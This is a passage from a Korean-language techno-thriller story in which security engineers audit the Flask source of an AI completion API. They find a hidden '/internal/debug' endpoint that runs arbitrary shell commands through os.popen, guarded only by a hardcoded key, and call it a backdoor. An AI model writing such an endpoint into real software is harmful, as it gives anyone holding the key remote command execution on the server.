```python
# nexus1_api/main.py (일부)
@app.route('/v1/completions', methods=['POST'])
def completions():
    data = request.get_json()
    prompt = data.get('prompt', '')
    max_tokens = data.get('max_tokens', 256)

    # Safety filter
    if is_unsafe(prompt):
        return jsonify({'error': 'unsafe prompt detected'}), 400

    # Model inference
    result = model.generate(prompt, max_tokens=max_tokens)

    return jsonify({
        'id': f'cmpl-{uuid4()}',
        'choices': [{'text': result}],
        'usage': {'prompt_tokens': len(prompt.split()), 'completion_tokens': len(result.split())}
    })
```

"이 코드에서 **보안 취약점을 찾는** 거야." 김영훈이 말했다. "정규, LLM으로 분석해봐."

### 수동 분석: 백도어 발견

LLM이 찾은 5개 취약점 외에, 김영훈이 직접 코드를 검토했다. 10년 경력의 보안 엔지니어의 눈.

코드를 스크롤하다 멈추었다.

```python
# nexus1_api/debug_utils.py

@app.route('/internal/debug', methods=['POST'])
def debug_endpoint():
    """Internal debug endpoint - DO NOT EXPOSE"""
    data = request.get_json()
    if data.get('key') == 'nexus1-debug-2024':
        cmd = data.get('cmd', '')
        result = os.popen(cmd).read()  # ← !!!
        return jsonify({'output': result})
    return jsonify({'error': 'unauthorized'}), 403
```

김영훈의 손이 멈추었다.

"... **이건 뭐야.**"

정규가 화면을 봤다. 얼굴이 변했다.

"`os.popen(cmd).read()`. **운영체제 명령 실행.** 인증은 하드코딩된 키 하나."

"**백도어야.**" 김영훈이 말했다. "`/internal/debug` 엔드포인트에 **하드코딩된 키**로 접근하면, **서버에서 아무 명령이나 실행**할 수 있어."

관제실이 얼어붙었다.

"이건... 누가 넣은 거예요?" 도윤이 물었다.

"코드의 **git blame**을 확인하자." 김영훈이 말했다.
